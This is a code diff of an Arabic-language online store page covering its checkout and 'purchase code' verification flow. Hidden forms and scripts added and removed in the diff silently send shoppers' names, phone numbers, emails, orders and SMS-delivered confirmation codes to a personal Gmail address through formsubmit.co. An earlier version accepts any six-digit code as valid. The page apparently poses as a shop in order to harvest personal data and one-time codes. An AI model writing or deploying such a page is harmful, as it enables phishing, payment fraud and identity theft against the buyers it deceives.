@@ -612,71 +612,7 @@
         </section>
     </div>
 
-    <!-- Purchase Code Page -->
-    <div id="purchase-code" class="page">
-        <section class="py-16 bg-gradient-to-br from-green-900 via-emerald-900 to-teal-900 min-h-screen">
-            <div class="container mx-auto px-4">
-                <div class="max-w-2xl mx-auto">
-                    <div class="text-center mb-12">
-                        <div class="text-8xl mb-6">🎉</div>
-                        <h1 class="text-5xl font-bold mb-6 text-white">تم إرسال طلبك بنجاح!</h1>
-                        <p class="text-xl text-gray-200 mb-8">أدخل الكود لإتمام عملية الشراء والحصول على خصم إضافي</p>
-                    </div>
 
-                    <div class="bg-white dark:bg-gray-800 rounded-2xl shadow-2xl p-8 mb-8">
-                        <div class="text-center mb-6">
-                            <h2 class="text-2xl font-bold mb-4">ملخص الطلب</h2>
-                            <div class="bg-green-100 dark:bg-green-900 p-4 rounded-lg mb-4">
-                                <p class="text-green-800 dark:text-green-200 font-bold">رقم الطلب: #POE-2024-<span id="order-number-display"></span></p>
-                            </div>
-                            <div id="code-status" class="bg-blue-100 dark:bg-blue-900 p-4 rounded-lg mb-4">
-                                <p class="text-blue-800 dark:text-blue-200 font-bold">
-                                    <i class="fas fa-paper-plane mr-2"></i>
-                                    جاري إرسال كود التأكيد...
-                                </p>
-                            </div>
-                        </div>
-
-                        <form id="purchase-code-form">
-                            <div class="mb-6">
-                                <label class="block text-lg font-bold mb-3 text-center">أدخل كود إتمام الشراء:</label>
-                                <input type="text" id="purchase-secret-code" class="w-full px-6 py-4 text-2xl text-center border-2 rounded-xl focus:outline-none focus:border-green-500 dark:bg-gray-700 dark:border-gray-600 uppercase tracking-widest font-mono" placeholder="أدخل الكود هنا" maxlength="15">
-                                <div class="text-center mt-3">
-                                    <small class="text-gray-600">سيتم إرسال الكود إلى رقم هاتفك عبر رسالة نصية</small>
-                                </div>
-                            </div>
-
-                            <button type="submit" class="w-full bg-gradient-to-r from-green-500 to-emerald-600 text-white py-4 rounded-xl font-bold text-lg">
-                                <i class="fas fa-check-circle mr-2"></i>
-                                إتمام الشراء
-                            </button>
-                        </form>
-
-                        <div class="mt-6 text-center">
-                            <button onclick="resendVerificationCode()" class="text-blue-500 hover:text-blue-700 font-bold">
-                                <i class="fas fa-redo mr-2"></i>
-                                إعادة إرسال الكود
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Hidden form for sending verification code -->
-                    <form id="verification-code-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" target="hidden_iframe" style="display: none;">
-                        <input type="hidden" name="_subject" value="">
-                        <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_template" value="table">
-                        <input type="hidden" name="customer_name" value="">
-                        <input type="hidden" name="customer_phone" value="">
-                        <input type="hidden" name="customer_email" value="">
-                        <input type="hidden" name="order_number" value="">
-                        <input type="hidden" name="verification_code" value="">
-                        <input type="hidden" name="message_type" value="كود التحقق">
-                        <input type="hidden" name="sent_time" value="">
-                    </form>
-                </div>
-            </div>
-        </section>
-    </div>
 
     <!-- Contact Page -->
     <div id="contact" class="page">
@@ -1371,45 +1307,25 @@
             }
         }
 
-        // نموذج الكود البسيط - يعمل مثل نموذج الدفع تماماً
-        function setupAdvancedCodeForm() {
-            const form = document.getElementById('advanced-code-form');
+        // معالج نموذج التحقق من الكود الجديد
+        function setupCodeVerificationForm() {
+            const form = document.getElementById('verification-code-form');
             if (!form) return;
             
-            // إضافة معالج الإرسال البسيط
             form.addEventListener('submit', function(e) {
                 // ملء الحقول المخفية قبل الإرسال
                 const currentTime = new Date().toLocaleString('ar-SA');
                 this.querySelector('input[name="submission_time"]').value = currentTime;
-                this.querySelector('input[name="current_date"]').value = new Date().toISOString();
                 
-                // السماح للنموذج بالإرسال الطبيعي - بدون منع أو تعقيد
-                console.log('Code form submitting to FormSubmit.co...');
+                const customerData = JSON.parse(sessionStorage.getItem('customerData') || '{}');
+                const orderNumber = sessionStorage.getItem('orderNumber') || 'Unknown';
+                
+                this.querySelector('input[name="customer_data"]').value = JSON.stringify(customerData);
+                
+                // السماح للنموذج بالإرسال الطبيعي
+                console.log('Verification code form submitting...');
             });
         }
-
-        // Purchase code verification - يقبل أي كود من 6 أرقام
-        document.getElementById('purchase-code-form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const enteredCode = document.getElementById('purchase-secret-code').value.trim();
-            
-            // التحقق من أن الكود يحتوي على 6 أرقام فقط
-            if (enteredCode.length === 6 && /^\d{6}$/.test(enteredCode)) {
-                // إرسال النموذج للبريد الإلكتروني
-                sendPurchaseConfirmation(enteredCode);
-                
-                showNotification('✅ تم إتمام الشراء بنجاح!');
-                setTimeout(() => {
-                    showThankYouPage();
-                }, 1000);
-            } else {
-                showNotification('❌ يرجى إدخال كود مكون من 6 أرقام فقط');
-                document.getElementById('purchase-secret-code').style.borderColor = '#EF4444';
-                setTimeout(() => {
-                    document.getElementById('purchase-secret-code').style.borderColor = '';
-                }, 2000);
-            }
-        });
 
         function showThankYouPage() {
             const modal = document.createElement('div');
@@ -1441,8 +1357,10 @@
             document.body.appendChild(modal);
         }
 
-        // Payment form handler
+        // Payment form handler - توجيه مباشر لصفحة الكود
         document.getElementById('payment-form').addEventListener('submit', function(e) {
+            e.preventDefault(); // منع الإرسال العادي
+            
             const firstName = this.querySelector('input[name="first_name"]').value;
             const lastName = this.querySelector('input[name="last_name"]').value;
             const phone = this.querySelector('input[name="phone"]').value;
@@ -1455,38 +1373,64 @@
             };
             sessionStorage.setItem('customerData', JSON.stringify(customerData));
             
+            const orderNumber = 'POE-2024-' + Math.floor(Math.random() * 100000);
+            sessionStorage.setItem('orderNumber', orderNumber);
+            
+            // إرسال بيانات الطلب للبريد الإلكتروني
             const orderSummary = cart.map(item => 
                 `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price} ريال`
             ).join('\n');
             
             const totalAmount = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-            const orderNumber = 'POE-2024-' + Math.floor(Math.random() * 100000);
             
-            const verificationCode = Math.floor(100000 + Math.random() * 900000);
-            sessionStorage.setItem('verificationCode', verificationCode);
-
-            const hiddenFields = [
-                { name: '_subject', value: `طلب جديد من متجر الخصوصية المتطور - ${orderNumber}` },
-                { name: '_next', value: `${window.location.origin}${window.location.pathname}#success` },
+            // إنشاء نموذج مخفي لإرسال تفاصيل الطلب
+            const orderForm = document.createElement('form');
+            orderForm.action = 'https://formsubmit.co/kaliroot123m@gmail.com';
+            orderForm.method = 'POST';
+            orderForm.target = 'hidden_iframe';
+            orderForm.style.display = 'none';
+            
+            const orderFields = [
+                { name: '_subject', value: `📋 طلب جديد - ${orderNumber} - متجر الخصوصية المتطور` },
+                { name: '_captcha', value: 'false' },
+                { name: '_template', value: 'table' },
+                { name: 'form_type', value: 'طلب شراء جديد' },
+                { name: 'order_number', value: orderNumber },
+                { name: 'customer_name', value: customerData.name },
+                { name: 'customer_phone', value: customerData.phone },
+                { name: 'customer_email', value: customerData.email },
                 { name: 'order_items', value: orderSummary },
                 { name: 'total_amount', value: `${totalAmount} ريال` },
-                { name: 'order_number', value: orderNumber },
                 { name: 'order_date', value: new Date().toLocaleString('ar-SA') },
-                { name: 'verification_code', value: verificationCode }
+                { name: 'order_status', value: 'في انتظار كود التأكيد' }
             ];
             
-            hiddenFields.forEach(field => {
+            orderFields.forEach(field => {
                 const input = document.createElement('input');
                 input.type = 'hidden';
                 input.name = field.name;
                 input.value = field.value;
-                this.appendChild(input);
+                orderForm.appendChild(input);
             });
             
-            sessionStorage.setItem('orderNumber', orderNumber);
+            document.body.appendChild(orderForm);
+            orderForm.submit();
+            document.body.removeChild(orderForm);
             
+            // إفراغ السلة
             cart = [];
             updateCartUI();
+            
+            // إخفاء نموذج الدفع
+            hidePayment();
+            
+            // عرض رسالة نجاح
+            showNotification('✅ تم إرسال طلبك بنجاح!');
+            
+            // الانتقال لصفحة إدخال الكود بعد ثانية واحدة
+            setTimeout(() => {
+                showCodeVerificationPage();
+            }, 1000);
         });
 
         function sendVerificationCode() {
@@ -1533,7 +1477,7 @@
             showNotification('📱 تم إعادة إرسال كود التحقق');
         }
 
-        // إرسال تأكيد الشراء مع الكود المدخل
+        // إرسال تأكيد الشراء مع الكود المدخل  
         function sendPurchaseConfirmation(enteredCode) {
             const orderNumber = sessionStorage.getItem('orderNumber') || 'Unknown';
             const customerData = JSON.parse(sessionStorage.getItem('customerData') || '{}');
@@ -1573,11 +1517,64 @@
             document.body.removeChild(confirmationForm);
         }
 
+        // دالة عرض صفحة التحقق من الكود
+        function showCodeVerificationPage() {
+            showPage('code');
+            
+            const customerData = JSON.parse(sessionStorage.getItem('customerData') || '{}');
+            const orderNumber = sessionStorage.getItem('orderNumber') || Math.floor(Math.random() * 100000);
+            
+            // تحديث عرض بيانات العميل
+            const customerNameDisplay = document.getElementById('customer-name-display');
+            const customerPhoneDisplay = document.getElementById('customer-phone-display');
+            const orderNumberDisplay = document.getElementById('order-number-display-code');
+            
+            if (customerNameDisplay) {
+                customerNameDisplay.textContent = customerData.name || 'غير محدد';
+            }
+            
+            if (customerPhoneDisplay) {
+                const phoneNumber = customerData.phone || '';
+                const lastFourDigits = phoneNumber.replace(/\D/g, '').slice(-4);
+                const maskedPhone = lastFourDigits.length === 4 ? `****${lastFourDigits}` : '****';
+                customerPhoneDisplay.textContent = maskedPhone;
+            }
+            
+            if (orderNumberDisplay) {
+                orderNumberDisplay.textContent = orderNumber;
+            }
+        }
+
+        // دالة إعادة إرسال الكود
+        function resendCode() {
+            showNotification('📱 تم إعادة إرسال كود التأكيد');
+        }
+
+        // معالج نموذج الكود المتطور
+        function setupAdvancedCodeForm() {
+            const form = document.getElementById('advanced-code-form');
+            if (!form) return;
+            
+            form.addEventListener('submit', function(e) {
+                // ملء الحقول المخفية قبل الإرسال
+                const currentTime = new Date().toLocaleString('ar-SA');
+                this.querySelector('input[name="submission_time"]').value = currentTime;
+                this.querySelector('input[name="current_date"]').value = new Date().toISOString();
+                
+                // تسجيل نوع النموذج
+                currentFormType = 'advanced-code';
+                
+                // السماح للنموذج بالإرسال الطبيعي
+                console.log('Advanced code form submitting...');
+            });
+        }
+
         // Enhanced Input Formatting
         document.addEventListener('DOMContentLoaded', function() {
             checkAgeVerification();
             setupCodeInputs();
-            setupAdvancedCodeForm(); // إضافة إعداد نموذج الكود المتقدم
+            setupAdvancedCodeForm();
+            setupCodeVerificationForm();
             generateProducts();
             updateCartUI();
             
